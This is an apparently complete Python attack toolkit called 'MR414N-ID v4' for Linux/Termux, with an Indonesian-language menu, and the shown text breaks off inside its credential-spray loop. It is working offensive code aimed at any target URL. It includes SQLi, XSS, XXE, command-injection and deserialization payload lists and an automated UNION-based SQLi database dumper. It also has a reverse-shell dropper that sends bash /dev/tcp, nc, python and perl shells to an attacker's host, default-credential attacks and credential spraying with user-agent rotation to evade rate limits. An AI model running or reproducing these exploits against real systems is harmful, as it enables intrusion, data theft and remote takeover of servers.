#!/usr/bin/env python3
# lang: Python3, file: mr414n_v4.py, target: Linux/Termux
# install: pip install requests colorama

import sys, time, socket, threading, subprocess
import json, datetime, re, base64, os, shutil
import requests
from colorama import init
init(autoreset=True)
import urllib3
urllib3.disable_warnings()

# ══════════════════════════════════════════
#  COLOR & FONT SYSTEM
# ══════════════════════════════════════════

C = {
    "r": "\033[91m", "g": "\033[92m", "y": "\033[93m", "b": "\033[94m",
    "m": "\033[95m", "c": "\033[96m", "w": "\033[97m", "d": "\033[90m",
    "x": "\033[0m",  "B": "\033[1m",
}

FONT = {
    "M": ["#   #", "## ##", "# # #", "#   #", "#   #"],
    "R": ["#### ", "#   #", "#### ", "#  # ", "#   #"],
    "4": ["#  # ", "#  # ", "#####", "   # ", "   # "],
    "1": ["  #  ", " ##  ", "  #  ", "  #  ", " ### "],
    "N": ["#   #", "##  #", "# # #", "#  ##", "#   #"],
    "-": ["     ", "     ", " ### ", "     ", "     "],
    "I": ["###", " # ", " # ", " # ", "###"],
    "D": ["#### ", "#   #", "#   #", "#   #", "#### "],
}

TUX = [
    "      .--.      ",
    "     |o_o |     ",
    "     |:_/ |     ",
    "    //   \\ \\    ",
    "   (|     | )   ",
    "  /'\\_   _/`\\   ",
    "  \\___)=(___/   ",
]

RESULTS    = {}
TARGET_URL = ""

def store(method, data):
    RESULTS[method] = data

def blok(teks):
    baris = [""] * 5
    for ch in teks:
        if ch not in FONT:
            continue
        for i in range(5):
            baris[i] += FONT[ch][i].replace("#", "█") + " "
    return baris

def banner():
    os.system("clear")
    cols = shutil.get_terminal_size((50, 20)).columns
    print()
    for line in TUX:
        print(C["y"] + C["B"] + line.center(cols) + C["x"])
        time.sleep(0.05)
    print()
    teks = "MR414N-ID"
    needed = sum(len(FONT.get(c, ["     "])[0]) + 1 for c in teks)
    groups = ["MR414N-ID"] if needed <= cols else ["MR414N", "-ID"]
    warna  = ["r", "y", "g", "c", "m"]
    for t in groups:
        for i, row in enumerate(blok(t)):
            print(C[warna[i % len(warna)]] + C["B"] + row.center(cols) + C["x"])
            time.sleep(0.05)
    print()
    info_lines = [
        ("Author  ", "MR414N-ID"),
        ("Version ", "v4 — OWASP Full + Auto-Exploit"),
        ("Mode    ", "Recon → Probe → Strike → Report"),
    ]
    for k, v in info_lines:
        print(C["m"] + f"  {k}: " + C["w"] + v + C["x"])
    print()

def menu():
    print(C["g"] + C["B"] + "  ┌─[ PILIH METODE ]────────────────────────────────┐")
    opts = [
        ("1",  "Header Inspector     ", "HTTP headers & security flags"),
        ("2",  "DNS Lookup           ", "Semua record DNS"),
        ("3",  "Port Scanner         ", "Port umum web server"),
        ("4",  "WHOIS Grab           ", "Info registrar & IP"),
        ("5",  "Dir Brute-Force      ", "Path & file tersembunyi"),
        ("6",  "Tech Fingerprint     ", "CMS / framework / server"),
        ("7",  "SQL Inject Probe     ", "SQLi — error & blind"),
        ("8",  "NoSQL Inject Probe   ", "MongoDB / NoSQL injection"),
        ("9",  "Command Inject Probe ", "OS command injection"),
        ("10", "XSS Probe            ", "Reflected + DOM XSS"),
        ("11", "XXE Probe            ", "XML External Entity"),
        ("12", "Broken Auth          ", "Default creds + cookie flags"),
        ("13", "Sensitive Data Scan  ", "File sensitif + HTTPS check"),
        ("14", "Broken Access Ctrl   ", "IDOR + method bypass"),
        ("15", "Security Misconfig   ", "Headers + verbose error"),
        ("16", "Insecure Deserial    ", "Serialized payload probe"),
        ("17", "Known Vuln Check     ", "Versi → CVE match"),
        ("18", "Subdomain Enum       ", "Subdomain aktif"),
        ("19", "SQLi Auto-Exploit    ", "UNION dump tabel & kolom"),
        ("20", "Reverse Shell Drop   ", "CMDi → shell via netcat/bash"),
        ("21", "Credential Spray     ", "Wordlist + header rotation"),
        ("22", "LFI Probe            ", "Path traversal + filter bypass"),
        ("23", "Open Redirect Scan   ", "Parameter redirect hijack"),
        ("24", "SSRF Probe           ", "Internal fetch + meta-data"),
        ("A",  "ALL — Full OWASP     ", "Semua metode sekaligus"),
    ]
    for code, name, desc in opts:
        print(C["g"] + "  │ " + C["y"] + f"[{code:>2}]" +
              C["w"] + f" {name}" + C["c"] + f"→ {desc}")
    print(C["g"] + C["B"] + "  └──────────────────────────────────────────────────┘")
    print()

def section(title):
    print(C["c"] + C["B"] + f"\n  ─── {title} " + "─" * max(1, 42 - len(title)))

def hit(msg):  print(C["g"] + f"  [+] {msg}" + C["x"])
def miss(msg): print(C["r"] + f"  [-] {msg}" + C["x"])
def info(msg): print(C["y"] + f"  [*] {msg}" + C["x"])
def warn(msg): print(C["r"] + C["B"] + f"  [⚠] {msg}" + C["x"])

def get_target(method_name):
    global TARGET_URL
    section(method_name)
    url = input(C["w"] + "  Masukkan URL target » ").strip()
    if not url.startswith("http"):
        url = "https://" + url
    TARGET_URL = url
    return url

def get_domain(url):
    return url.replace("https://","").replace("http://","").split("/")[0]

HEADERS = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) "
                         "AppleWebKit/537.36 Chrome/120.0"}

# ══════════════════════════════════════════
#  METODE LAMA (1-18)
# ══════════════════════════════════════════

def header_inspector(url):
    info("Fetching headers...")
    data = {"url": url, "headers": {}, "status": None, "final_url": None, "success": False}
    try:
        r = requests.get(url, timeout=10, verify=False, headers=HEADERS)
        data["headers"]   = dict(r.headers)
        data["status"]    = r.status_code
        data["final_url"] = r.url
        data["success"]   = True
        for k, v in r.headers.items():
            print(C["g"] + f"  {k}: " + C["w"] + v)
        print(C["c"] + f"\n  Status : {r.status_code}")
        print(C["c"] + f"  URL    : {r.url}")
    except Exception as e:
        miss(str(e)); data["error"] = str(e)
    store("Header Inspector", data)

def dns_lookup(url):
    domain = get_domain(url)
    info(f"DNS Lookup → {domain}")
    data = {"domain": domain, "records": {}, "success": False}
    for rt in ["A","AAAA","MX","NS","TXT","CNAME"]:
        try:
            res = subprocess.run(["dig","+short",rt,domain],
                                 capture_output=True, text=True, timeout=5)
            out = res.stdout.strip()
            if out:
                data["records"][rt] = out.splitlines()
                data["success"] = True
                hit(f"[{rt}] {out}")
        except Exception:
            data["records"][rt] = []
    store("DNS Lookup", data)

def port_scanner(url):
    domain = get_domain(url)
    info(f"Port Scan → {domain}")
    ports = [21,22,23,25,53,80,443,8080,8443,3306,5432,6379,27017]
    data  = {"domain": domain, "open": [], "closed": [], "success": False}
    lock  = threading.Lock()
    def check(p):
        try:
            s = socket.socket(); s.settimeout(1)
            s.connect((domain, p)); s.close()
            with lock:
                data["open"].append(p); data["success"] = True
                hit(f"OPEN  :{p}")
        except:
            with lock:
                data["closed"].append(p)
    threads = [threading.Thread(target=check, args=(p,)) for p in ports]
    for t in threads: t.start()
    for t in threads: t.join()
    store("Port Scanner", data)

def whois_grab(url):
    domain = get_domain(url)
    info(f"WHOIS → {domain}")
    data = {"domain": domain, "info": [], "success": False}
    try:
        res = subprocess.run(["whois", domain], capture_output=True, text=True, timeout=10)
        keys = ["registrar","creation","expiry","name server","registrant","country","dnssec"]
        lines = [l for l in res.stdout.splitlines()
                 if any(k in l.lower() for k in keys)]
        for l in lines:
            hit(l.strip()); data["info"].append(l.strip())
        if lines: data["success"] = True
    except Exception as e:
        miss(str(e)); data["error"] = str(e)
    store("WHOIS Grab", data)

WORDLIST = [
    "admin","login","wp-admin","dashboard","config","backup","test","api","upload",
    "shell","phpinfo","robots.txt",".env",".git","wp-config.php","setup","install",
    "debug","phpmyadmin","adminer","console","manager","panel","xmlrpc.php",
    "readme.html","license.txt","server-status",
]

def dir_bruteforce(url):
    info(f"Dir Brute → {url}")
    data = {"url": url, "found": [], "checked": len(WORDLIST), "success": False}
    for path in WORDLIST:
        target = f"{url.rstrip('/')}/{path}"
        try:
            r = requests.get(target, timeout=5, verify=False, headers=HEADERS)
            if r.status_code in [200,301,302,403]:
                hit(f"{r.status_code} → {target}")
                data["found"].append({"path": target, "status": r.status_code})
            else:
                miss(f"{r.status_code} → {target}")
        except:
            pass
    if data["found"]: data["success"] = True
    store("Dir Brute-Force", data)

def tech_fingerprint(url):
    info(f"Tech Fingerprint → {url}")
    data = {"url": url, "detected": [], "server": "", "powered_by": "", "success": False}
    try:
        r    = requests.get(url, timeout=10, verify=False, headers=HEADERS)
        h    = r.headers
        body = r.text.lower()
        checks = {
            "WordPress" : "wp-content" in body or "wp-includes" in body,
            "Joomla"    : "joomla" in body,
            "Drupal"    : "drupal" in body,
            "Laravel"   : "laravel" in body,
            "Django"    : "csrfmiddlewaretoken" in body,
            "React"     : "react" in body or "__react" in body,
            "PHP"       : "php" in h.get("x-powered-by","").lower(),
            "Nginx"     : "nginx" in h.get("server","").lower(),
            "Apache"    : "apache" in h.get("server","").lower(),
            "Cloudflare": "cf-ray" in h,
            "ASP.NET"   : "asp.net" in h.get("x-powered-by","").lower(),
        }
        for tech, detected in checks.items():
            if detected:
                hit(tech); data["detected"].append(tech)
        data["server"]     = h.get("server","unknown")
        data["powered_by"] = h.get("x-powered-by","unknown")
        if data["detected"]: data["success"] = True
        print(C["c"] + f"\n  Server       : {data['server']}")
        print(C["c"] + f"  X-Powered-By : {data['powered_by']}")
    except Exception as e:
        miss(str(e)); data["error"] = str(e)
    store("Tech Fingerprint", data)

def subdomain_enum(url):
    domain = get_domain(url)
    info(f"Subdomain Enum → {domain}")
    data = {"domain": domain, "live": [], "success": False}
    lock = threading.Lock()
    subs = [
        "www","mail","ftp","admin","dev","api","test","staging","portal","vpn",
        "remote","login","cpanel","webmail","shop","blog","cdn","static","assets",
        "media","beta","old","backup","secure","app","mobile","m",
    ]
    def check(sub):
        host = f"{sub}.{domain}"
        try:
            ip = socket.gethostbyname(host)
            with lock:
                hit(f"{host} → {ip}")
                data["live"].append({"host": host, "ip": ip})
                data["success"] = True
        except:
            pass
    threads = [threading.Thread(target=check, args=(s,)) for s in subs]
    for t in threads: t.start()
    for t in threads: t.join()
    store("Subdomain Enum", data)

SQLI_PAYLOADS = [
    "'", '"', "' OR '1'='1", "' OR 1=1--",
    '" OR ""="', "1' ORDER BY 1--", "1' ORDER BY 2--", "1' ORDER BY 3--",
    "' UNION SELECT NULL--", "' UNION SELECT NULL,NULL--",
    "1 AND SLEEP(3)--", "1' AND SLEEP(3)--", "1; DROP TABLE users--",
]
SQL_ERRORS = ["sql","mysql","syntax","error","warning","ora-","pg_query",
              "sqlite","mssql","unclosed quotation","microsoft ole db"]

def sqli_probe(url):
    info(f"SQLi Probe → {url}")
    data = {"url": url, "vulnerable": [], "blind": [], "tested": len(SQLI_PAYLOADS), "success": False}
    for pl in SQLI_PAYLOADS:
        target = f"{url}?id={requests.utils.quote(pl)}"
        try:
            t0      = time.time()
            r       = requests.get(target, timeout=8, verify=False, headers=HEADERS)
            elapsed = time.time() - t0
            if any(e in r.text.lower() for e in SQL_ERRORS):
                warn(f"ERROR-BASED VULN → {pl}")
                data["vulnerable"].append(pl); data["success"] = True
            elif elapsed > 2.5 and "SLEEP" in pl.upper():
                warn(f"TIME-BASED BLIND → {pl} ({elapsed:.1f}s)")
                data["blind"].append(pl); data["success"] = True
            else:
                miss(f"clean → {pl}")
        except:
            pass
    store("SQL Inject Probe", data)

NOSQL_PAYLOADS = [
    '{"$gt": ""}', '{"$ne": null}',
    '{"$where": "sleep(1000)"}',
    '{"username": {"$gt": ""}, "password": {"$gt": ""}}',
]

def nosql_probe(url):
    info(f"NoSQL Probe → {url}")
    data = {"url": url, "vulnerable": [], "tested": len(NOSQL_PAYLOADS), "success": False}
    for pl in NOSQL_PAYLOADS:
        try:
            r = requests.post(url, json=json.loads(pl), timeout=6, verify=False, headers=HEADERS)
            if r.status_code in [200,302] and len(r.text) > 100:
                warn(f"POSSIBLE NOSQL VULN → {pl}")
                data["vulnerable"].append(pl); data["success"] = True
            else:
                miss(f"clean → {pl[:40]}")
        except Exception as e:
            miss(f"error → {e}")
    store("NoSQL Inject Probe", data)

CMD_PAYLOADS = [
    "; ls", "| ls", "`ls`", "$(ls)", "; id", "| id", "`id`", "$(id)",
    "; cat /etc/passwd", "| cat /etc/passwd", "; sleep 3", "| sleep 3",
    "&& whoami", "|| whoami",
]
CMD_SIGNS = ["root:","bin:","daemon:","uid=","www-data","total ","drwx","rwxr"]

def cmdi_probe(url):
    info(f"Command Injection Probe → {url}")
    data = {"url": url, "vulnerable": [], "tested": len(CMD_PAYLOADS), "success": False}
    for pl in CMD_PAYLOADS:
        target = f"{url}?cmd={requests.utils.quote(pl)}"
        try:
            t0      = time.time()
            r       = requests.get(target, timeout=8, verify=False, headers=HEADERS)
            elapsed = time.time() - t0
            if any(s in r.text for s in CMD_SIGNS):
                warn(f"CMDI VULN → {pl}")
                data["vulnerable"].append(pl); data["success"] = True
            elif elapsed > 2.5 and "sleep" in pl.lower():
                warn(f"BLIND CMDI (time) → {pl} ({elapsed:.1f}s)")
                data["vulnerable"].append(pl); data["success"] = True
            else:
                miss(f"clean → {pl}")
        except:
            pass
    store("Command Inject Probe", data)

XSS_PAYLOADS = [
    "<script>alert(1)</script>", '"><script>alert(1)</script>',
    "'><img src=x onerror=alert(1)>", "<svg onload=alert(1)>",
    "<body onload=alert(1)>", "javascript:alert(1)",
    "<iframe src=javascript:alert(1)>", '"><svg/onload=alert(1)>',
    "'-alert(1)-'", "<script>document.write(document.cookie)</script>",
]

def xss_probe(url):
    info(f"XSS Probe → {url}")
    data = {"url": url, "reflected": [], "tested": len(XSS_PAYLOADS), "success": False}
    for pl in XSS_PAYLOADS:
        target = f"{url}?q={requests.utils.quote(pl)}"
        try:
            r = requests.get(target, timeout=5, verify=False, headers=HEADERS)
            if pl.lower() in r.text.lower():
                warn(f"REFLECTED XSS → {pl[:60]}")
                data["reflected"].append(pl); data["success"] = True
            else:
                miss(f"not reflected → {pl[:50]}")
        except:
            pass
    store("XSS Probe", data)

XXE_PAYLOADS = [
    '<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>\n<root>&xxe;</root>',
    '<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/hostname">]>\n<root>&xxe;</root>',
    '<?xml version="1.0"?>\n<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">]>\n<root>&xxe;</root>',
]
XXE_SIGNS = ["root:","bin:","daemon:","hostname","ami-id","instance-id"]

def xxe_probe(url):
    info(f"XXE Probe → {url}")
    data = {"url": url, "vulnerable": [], "tested": len(XXE_PAYLOADS), "success": False}
    xml_headers = {**HEADERS, "Content-Type": "application/xml"}
    for pl in XXE_PAYLOADS:
        try:
            r = requests.post(url, data=pl, timeout=8, verify=False, headers=xml_headers)
            if any(s in r.text for s in XXE_SIGNS):
                warn("XXE VULN DETECTED")
                data["vulnerable"].append(pl[:80]); data["success"] = True
            else:
                miss("no XXE response")
        except Exception as e:
            miss(str(e))
    store("XXE Probe", data)

DEFAULT_CREDS = [
    ("admin","admin"), ("admin","password"), ("admin","123456"), ("admin",""),
    ("root","root"), ("root","toor"), ("test","test"), ("user","user"),
    ("guest","guest"), ("administrator","administrator"),
]
LOGIN_PATHS = ["/login","/admin","/wp-login.php","/administrator",
               "/user/login","/auth/login","/signin","/panel"]

def broken_auth(url):
    info(f"Broken Auth → {url}")
    data = {"url": url, "weak_creds": [], "cookie_issues": [], "login_found": [], "success": False}
    try:
        r = requests.get(url, timeout=8, verify=False, headers=HEADERS)
        for ck in r.cookies:
            issues = []
            if not ck.secure: issues.append("no Secure flag")
            if not ck.has_nonstandard_attr("HttpOnly"): issues.append("no HttpOnly flag")
            if issues:
                warn(f"Cookie '{ck.name}': {', '.join(issues)}")
                data["cookie_issues"].append({"cookie": ck.name, "issues": issues})
                data["success"] = True
            else:
                hit(f"Cookie '{ck.name}': flags OK")
    except Exception as e:
        miss(str(e))
    for path in LOGIN_PATHS:
        target = url.rstrip("/") + path
        try:
            r = requests.get(target, timeout=5, verify=False, headers=HEADERS)
            if r.status_code in [200,302]:
                hit(f"Login page found → {target}")
                data["login_found"].append(target)
                for usr, pwd in DEFAULT_CREDS:
                    try:
                        rp = requests.post(
                            target,
                            data={"username": usr, "password": pwd,
                                  "user": usr, "pass": pwd, "email": usr},
                            timeout=5, verify=False, headers=HEADERS, allow_redirects=True)
                        fail_signs = ["invalid","incorrect","wrong","failed","error","login"]
                        if rp.status_code in [200,302] and not any(
                                s in rp.text.lower() for s in fail_signs):
                            warn(f"WEAK CREDS → {usr}:{pwd} @ {target}")
                            data["weak_creds"].append({"url": target, "user": usr, "pass": pwd})
                            data["success"] = True
                        else:
                            miss(f"failed → {usr}:{pwd}")
                    except:
                        pass
        except:
            pass
    store("Broken Auth", data)

SENSITIVE_PATHS = [
    ".env",".env.backup",".env.local","config.php","config.yml","config.json",
    "database.yml","settings.py","wp-config.php","backup.sql","dump.sql","db.sql",
    ".git/config",".git/HEAD","id_rsa","id_dsa","private.key","server.key",
    "ssl.key","cert.pem","phpinfo.php","info.php","test.php","error_log",
    "access.log","debug.log","composer.json","package.json","Dockerfile",
    "docker-compose.yml",".htpasswd",".bash_history",
]

def sensitive_data_scan(url):
    info(f"Sensitive Data Scan → {url}")
    data = {"url": url, "exposed": [], "https": False, "success": False}
    data["https"] = url.startswith("https://")
    if not data["https"]:
        warn("HTTP saja — data tidak terenkripsi")
        data["success"] = True
    for path in SENSITIVE_PATHS:
        target = f"{url.rstrip('/')}/{path}"
        try:
            r = requests.get(target, timeout=5, verify=False, headers=HEADERS)
            if r.status_code == 200 and len(r.text) > 10:
                warn(f"EXPOSED → {target}")
                data["exposed"].append({"path": target, "status": r.status_code, "size": len(r.text)})
                data["success"] = True
            else:
                miss(f"{r.status_code} → {path}")
        except:
            pass
    store("Sensitive Data Scan", data)

ADMIN_PATHS = [
    "/admin","/admin/","/admin/dashboard","/manager","/superuser","/root",
    "/api/admin","/api/users","/api/config","/user/1","/user/2",
    "/user/admin","/account/1","/account/2",
]
HTTP_METHODS = ["GET","POST","PUT","DELETE","PATCH","OPTIONS","TRACE"]

def broken_access_ctrl(url):
    info(f"Broken Access Control → {url}")
    data = {"url": url, "idor": [], "method_bypass": [], "open_admin": [], "success": False}
    for path in ADMIN_PATHS:
        target = url.rstrip("/") + path
        try:
            r = requests.get(target, timeout=5, verify=False, headers=HEADERS)
            if r.status_code in [200,302]:
                warn(f"OPEN without auth → {target}")
                data["open_admin"].append({"path": target, "status": r.status_code})
                data["success"] = True
            else:
                miss(f"{r.status_code} → {path}")
        except:
            pass
    for method in HTTP_METHODS:
        try:
            r = requests.request(method, url, timeout=5, verify=False, headers=HEADERS)
            if method not in ["GET","POST"] and r.status_code < 400:
                warn(f"METHOD ALLOWED → {method} ({r.status_code})")
                data["method_bypass"].append({"method": method, "status": r.status_code})
                data["success"] = True
            else:
                miss(f"{method} → {r.status_code}")
        except:
            pass
    store("Broken Access Control", data)

SEC_HEADERS_REQUIRED = [
    "strict-transport-security","x-content-type-options","x-frame-options",
    "content-security-policy","permissions-policy","referrer-policy","x-xss-protection",
]
VERBOSE_SIGNS = [
    "stack trace","traceback","exception","debug","fatal error","syntax error",
    "on line","at line","undefined variable","notice:","warning:","mysql_fetch","pg_query",
]

def security_misconfig(url):
    info(f"Security Misconfig → {url}")
    data = {"url": url, "missing_headers": [], "verbose_errors": False,
            "server_info": "", "open_methods": [], "success": False}
    try:
        r = requests.get(url, timeout=10, verify=False, headers=HEADERS)
        h_lower = {k.lower(): v for k, v in r.headers.items()}
        for sh in SEC_HEADERS_REQUIRED:
            if sh not in h_lower:
                warn(f"MISSING → {sh}")
                data["missing_headers"].append(sh); data["success"] = True
            else:
                hit(f"Present → {sh}")
        srv = r.headers.get("server","")
        if srv and any(c.isdigit() for c in srv):
            warn(f"Server version exposed → {srv}"); data["success"] = True
        data["server_info"] = srv
        if any(s in r.text.lower() for s in VERBOSE_SIGNS):
            warn("Verbose error/debug info detected")
            data["verbose_errors"] = True; data["success"] = True
        ro    = requests.options(url, timeout=5, verify=False, headers=HEADERS)
        allow = ro.headers.get("Allow","")
        if allow:
            data["open_methods"] = allow.split(", ")
    except Exception as e:
        miss(str(e)); data["error"] = str(e)
    store("Security Misconfig", data)

DESER_PAYLOADS = {
    "PHP serialized"   : 'O:8:"stdClass":0:{}',
    "Java base64"      : base64.b64encode(b"\xac\xed\x00\x05sr\x00\x0bjava.lang.String").decode(),
    "Python pickle"    : base64.b64encode(b"cos\nsystem\n(S'id'\ntR.").decode(),
    "Ruby marshal"     : base64.b64encode(b"\x04\x08i\x00").decode(),
    "JSON type confuse": '{"__class__":"os","__reduce__":["system",["id"]]}',
}
DESER_SIGNS = [
    "unserialize","deserialization","java.io","pickle","marshal",
    "objectinputstream","classnotfoundexception","streamcorruptedexception","uid=","root:","bin:",
]

def insecure_deser(url):
    info(f"Insecure Deserialization → {url}")
    data = {"url": url, "vulnerable": [], "tested": len(DESER_PAYLOADS), "success": False}
    for name, payload in DESER_PAYLOADS.items():
        try:
            r = requests.post(url, data=payload, timeout=6, verify=False,
                              headers={**HEADERS, "Content-Type": "application/octet-stream"})
            if any(s in r.text.lower() for s in DESER_SIGNS):
                warn(f"DESER SIGN → {name}")
                data["vulnerable"].append(name); data["success"] = True
            r2 = requests.get(f"{url}?data={requests.utils.quote(payload)}",
                              timeout=6, verify=False, headers=HEADERS)
            if any(s in r2.text.lower() for s in DESER_SIGNS):
                warn(f"DESER SIGN (GET) → {name}")
                data["vulnerable"].append(f"{name} (GET)"); data["success"] = True
        except Exception as e:
            miss(str(e))
    store("Insecure Deserialization", data)

CVE_DB = {
    "wordpress 6.0" : "CVE-2022-3590 — reflected XSS",
    "wordpress 5.8" : "CVE-2021-39200 — info disclosure",
    "wordpress 5.6" : "CVE-2021-29447 — XXE via media upload",
    "joomla 3.9"    : "CVE-2019-10945 — path traversal",
    "joomla 4.0"    : "CVE-2023-23752 — improper access check",
    "drupal 9"      : "CVE-2022-25271 — remote code execution",
    "apache 2.4.49" : "CVE-2021-41773 — path traversal RCE",
    "apache 2.4.50" : "CVE-2021-42013 — path traversal bypass",
    "nginx 1.18"    : "CVE-2021-23017 — off-by-one in resolver",
    "php 8.0"       : "CVE-2022-31628 — stack overflow",
    "php 7.4"       : "CVE-2020-7071 — URL parsing bypass",
    "laravel 8"     : "CVE-2021-3129 — RCE via debug mode",
    "django 3.2"    : "CVE-2022-28347 — SQL injection",
}

def known_vuln_check(url):
    info(f"Known Vuln Check → {url}")
    data = {"url": url, "matches": [], "versions_found": [], "success": False}
    try:
        r    = requests.get(url, timeout=10, verify=False, headers=HEADERS)
        body = r.text.lower()
        version_hints = []
        srv = r.headers.get("server","").lower()
        px  = r.headers.get("x-powered-by","").lower()
        if srv: version_hints.append(srv)
        if px:  version_hints.append(px)
        gen = re.findall(r'generator["\s]+content=["\s]+([^"]+)', body)
        version_hints.extend(gen)
        data["versions_found"] = version_hints
        for hint in version_hints:
            for key, cve in CVE_DB.items():
                if all(part in hint for part in key.split()):
                    warn(f"MATCH → {key} : {cve}")
                    data["matches"].append({"version": key, "cve": cve})
                    data["success"] = True
    except Exception as e:
        miss(str(e)); data["error"] = str(e)
    store("Known Vuln Check", data)

# ══════════════════════════════════════════
#  METODE BARU (19-24)
# ══════════════════════════════════════════

# 19 — SQLi Auto-Exploit (UNION-based dump)
UNION_DETECT = [
    "' ORDER BY 1--",
    "' ORDER BY 2--",
    "' ORDER BY 3--",
    "' ORDER BY 4--",
    "' ORDER BY 5--",
]

def sqli_autoexploit(url):
    info(f"SQLi Auto-Exploit → {url}")
    data = {"url": url, "columns": 0, "tables": [], "columns_dump": {}, "success": False}

    # langkah 1: hitung jumlah kolom via ORDER BY
    col_count = 0
    for i in range(1, 11):
        pl     = f"' ORDER BY {i}--"
        target = f"{url}?id={requests.utils.quote(pl)}"
        try:
            r = requests.get(target, timeout=6, verify=False, headers=HEADERS)
            if any(e in r.text.lower() for e in ["unknown column","order by clause","1 order by"]):
                col_count = i - 1
                break
            col_count = i
        except:
            break

    if col_count == 0:
        miss("Tidak bisa deteksi jumlah kolom"); store("SQLi Auto-Exploit", data); return
    hit(f"Jumlah kolom terdeteksi: {col_count}")
    data["columns"] = col_count

    # langkah 2: cari kolom yang menampilkan output (string reflection)
    nulls    = ",".join(["NULL"] * col_count)
    vis_col  = None
    for i in range(1, col_count + 1):
        parts     = ["NULL"] * col_count
        parts[i-1] = "'MR414N_TEST'"
        pl     = f"' UNION SELECT {','.join(parts)}--"
        target = f"{url}?id=-1{requests.utils.quote(pl[1:])}"
        try:
            r = requests.get(target, timeout=6, verify=False, headers=HEADERS)
            if "MR414N_TEST" in r.text:
                vis_col = i
                hit(f"Kolom visible untuk output: #{vis_col}")
                break
        except:
            pass

    if vis_col is None:
        miss("Tidak ada kolom yang visible"); store("SQLi Auto-Exploit", data); return

    def union_fetch(payload_val):
        parts     = ["NULL"] * col_count
        parts[vis_col-1] = payload_val
        pl     = f"' UNION SELECT {','.join(parts)}--"
        target = f"{url}?id=-1{requests.utils.quote(pl[1:])}"
        try:
            r   = requests.get(target, timeout=8, verify=False, headers=HEADERS)
            raw = re.findall(r'MR414N\|(.*?)\|MR414N', r.text)
            return raw
        except:
            return []

    # langkah 3: dump nama database
    db_results = union_fetch("CONCAT('MR414N|',database(),'|MR414N')")
    if db_results:
        warn(f"Database: {db_results[0]}")
        data["database"] = db_results[0]

    # langkah 4: dump tabel
    tbl_results = union_fetch(
        "GROUP_CONCAT('MR414N|',table_name,'|MR414N' SEPARATOR '~') "
        "FROM information_schema.tables WHERE table_schema=database()")
    if tbl_results:
        tables = [t for t in tbl_results[0].split("~") if t]
        for t in tables:
            warn(f"Table → {t}")
            data["tables"].append(t)
        data["success"] = True

    # langkah 5: dump kolom dari tabel pertama
    if data["tables"]:
        first_tbl = data["tables"][0]
        col_results = union_fetch(
            f"GROUP_CONCAT('MR414N|',column_name,'|MR414N' SEPARATOR '~') "
            f"FROM information_schema.columns WHERE table_name='{first_tbl}'")
        if col_results:
            cols = [c for c in col_results[0].split("~") if c]
            data["columns_dump"][first_tbl] = cols
            for c in cols:
                hit(f"  [{first_tbl}] → {c}")

    store("SQLi Auto-Exploit", data)

# 20 — Reverse Shell Dropper via CMDi
SHELL_PAYLOADS = [
    # bash
    "bash -c 'bash -i >& /dev/tcp/{ip}/{port} 0>&1'",
    # python3
    "python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\",\"-i\"])'",
    # nc mkfifo
    "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc {ip} {port} >/tmp/f",
    # perl
    "perl -e 'use Socket;$i=\"{ip}\";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname(\"tcp\"));connect(S,sockaddr_in($p,inet_aton($i)));open(STDIN,\">&S\");open(STDOUT,\">&S\");open(STDERR,\">&S\");exec(\"/bin/sh -i\");'",
]
CMD_PARAMS = ["cmd","command","exec","run","ping","host","ip","q","query","input","shell"]

def reverse_shell_drop(url):
    info(f"Reverse Shell Dropper → {url}")
    lhost = input(C["w"] + "  LHOST (IP attacker) » ").strip()
    lport = input(C["w"] + "  LPORT (port listener) » ").strip()
    data  = {"url": url, "lhost": lhost, "lport": lport,
             "vuln_param": None, "shell_sent": [], "success": False}

    # langkah 1: deteksi parameter vulnerable
    vuln_param = None
    for param in CMD_PARAMS:
        target = f"{url}?{param}=id"
        try:
            r = requests.get(target, timeout=6, verify=False, headers=HEADERS)
            if any(s in r.text for s in CMD_SIGNS):
                vuln_param = param
                hit(f"Param vulnerable: ?{param}=")
                break
        except:
            pass

    if not vuln_param:
        miss("Tidak ada parameter CMDi yang ditemukan")
        store("Reverse Shell Drop", data); return

    data["vuln_param"] = vuln_param

    # langkah 2: kirim tiap payload shell
    for pl_template in SHELL_PAYLOADS:
        pl     = pl_template.format(ip=lhost, port=lport)
        encoded = requests.utils.quote(pl)
        target  = f"{url}?{vuln_param}={encoded}"
        try:
            r = requests.get(target, timeout=4, verify=False, headers=HEADERS)
            warn(f"Shell payload sent → {pl[:60]}...")
            data["shell_sent"].append(pl)
            data["success"] = True
        except:
            pass

    if data["success"]:
        warn(f"Payload dikirim. Pastikan listener aktif: nc -lvnp {lport}")
    store("Reverse Shell Drop", data)

# 21 — Credential Spray
def credential_spray(url):
    info(f"Credential Spray → {url}")
    login_path = input(C["w"] + "  Login path (contoh: /login) » ").strip()
    user_file  = input(C["w"] + "  File username (kosong = default) » ").strip()
    pass_file  = input(C["w"] + "  File password (kosong = default) » ").strip()
    target     = url.rstrip("/") + login_path
    data       = {"url": target, "hits": [], "tested": 0, "success": False}

    default_users  = ["admin","administrator","root","user","test","guest","manager","operator"]
    default_passes = ["admin","password","123456","password1","admin123","letmein",
                      "welcome","monkey","dragon","master","qwerty","abc123",""]

    users  = open(user_file).read().splitlines() if user_file and os.path.exists(user_file) else default_users
    passes = open(pass_file).read().splitlines() if pass_file and os.path.exists(pass_file) else default_passes

    # rotasi user-agent untuk bypass rate limit sederhana
    ua_pool = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0",
        "Mozilla/5.0 (X11; Linux x86_64) Firefox/121.0",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 14) Safari/605.1",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0) Mobile/15E148",
        "python-requests/2.31.0",
    ]
    fail_signs = ["invalid","incorrect","wrong","failed","error","unauthorized","denied"]

    for i, (usr, pwd) in enumerate([(u, p) for u in users for p in passes]):
        ua = ua_pool[i % len(ua_pool)]
